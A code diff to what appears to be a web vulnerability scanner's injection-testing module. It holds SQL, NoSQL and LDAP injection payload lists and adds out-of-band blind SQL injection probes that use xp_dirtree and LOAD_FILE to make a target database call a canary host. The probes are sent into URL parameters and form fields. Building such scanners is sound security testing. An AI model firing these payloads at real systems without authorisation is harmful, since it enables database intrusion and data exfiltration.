@@ -5,6 +5,7 @@ from typing import List
 from scanner.core.scan_result import Finding, Severity
 from scanner.core.crawler import CrawlResult
 from scanner.utils.http import get_url_params, inject_url_param, fetch
+from scanner.utils.payloads import load_payloads
 
 ERROR_SIGNATURES = [
     "you have an error in your sql syntax", "warning: mysql",
@@ -15,30 +16,74 @@ ERROR_SIGNATURES = [
     "syntax error", "sql syntax",
 ]
 
-ERROR_PAYLOADS = ["'", '"', "' OR '1'='1", "\" OR \"1\"=\"1", "1 AND 1=2--"]
-BLIND_PAYLOADS = ["' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))x)--"]
-UNION_PAYLOADS = [
+_HARDCODED_ERROR = ["'", '"', "' OR '1'='1", "\" OR \"1\"=\"1", "1 AND 1=2--"]
+_HARDCODED_BLIND = ["' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))x)--"]
+_HARDCODED_UNION = [
     "' UNION SELECT NULL--",
     "' UNION SELECT NULL,NULL--",
     "' UNION SELECT NULL,NULL,NULL--",
 ]
+_HARDCODED_BOOLEAN = [("' AND 1=1--", "' AND 1=2--")]
+
+def _load_sqli():
+    data = load_payloads("sqli")
+    if not data:
+        return _HARDCODED_ERROR, _HARDCODED_BLIND, _HARDCODED_UNION, _HARDCODED_BOOLEAN
+    try:
+        error = data.get("error_payloads") or _HARDCODED_ERROR
+        blind = data.get("blind_payloads") or _HARDCODED_BLIND
+        union = data.get("union_payloads") or _HARDCODED_UNION
+        bool_pairs = [(p["true"], p["false"]) for p in data.get("boolean_pairs", [])] or _HARDCODED_BOOLEAN
+        return error, blind, union, bool_pairs
+    except (KeyError, TypeError):
+        return _HARDCODED_ERROR, _HARDCODED_BLIND, _HARDCODED_UNION, _HARDCODED_BOOLEAN
+
+ERROR_PAYLOADS, BLIND_PAYLOADS, UNION_PAYLOADS, BOOLEAN_PAYLOAD_PAIRS = _load_sqli()
+
 NOSQL_PAYLOADS = [
     ('{"$gt": ""}', "application/json"),
     ('{"$ne": null}', "application/json"),
     ('{"$where": "1==1"}', "application/json"),
 ]
 LDAP_PAYLOADS = ["*)(uid=*))(|(uid=*", "*)(|(password=*))", "admin)(&)"]
-BOOLEAN_PAYLOAD_PAIRS = [
-    ("' AND 1=1--", "' AND 1=2--"),
-]
 
 
-def test(page: CrawlResult, client: httpx.Client) -> List[Finding]:
+def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
     findings = []
     _test_forms(page, client, findings)
     _test_url_params(page, client, findings)
     _test_nosql(page, client, findings)
     _test_ldap(page, client, findings)
+
+    # Blind OOB SQLi payloads (MSSQL xp_dirtree, MySQL LOAD_FILE DNS exfil)
+    if oob and not findings:
+        canary = oob.get_canary()
+        oob_payloads = [
+            f"'; EXEC xp_dirtree '\\\\{canary}\\a'--",
+            f"1; EXEC xp_dirtree '\\\\{canary}\\a'--",
+            f"' AND LOAD_FILE('\\\\\\\\{canary}\\\\a')--",
+            f"1 AND LOAD_FILE('\\\\\\\\{canary}\\\\a')--",
+        ]
+        from scanner.utils.http import get_url_params, inject_url_param
+        params = get_url_params(page.url)
+        for param_name in params:
+            for payload in oob_payloads:
+                try:
+                    client.get(inject_url_param(page.url, param_name, payload), timeout=5)
+                except Exception:
+                    pass
+        for form in page.forms:
+            for inp in form["inputs"]:
+                if not inp["name"]:
+                    continue
+                for payload in oob_payloads[:2]:
+                    data = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
+                    data[inp["name"]] = payload
+                    try:
+                        client.request(form["method"].upper(), form["action"], data=data, timeout=5)
+                    except Exception:
+                        pass
+
     return findings
 
 
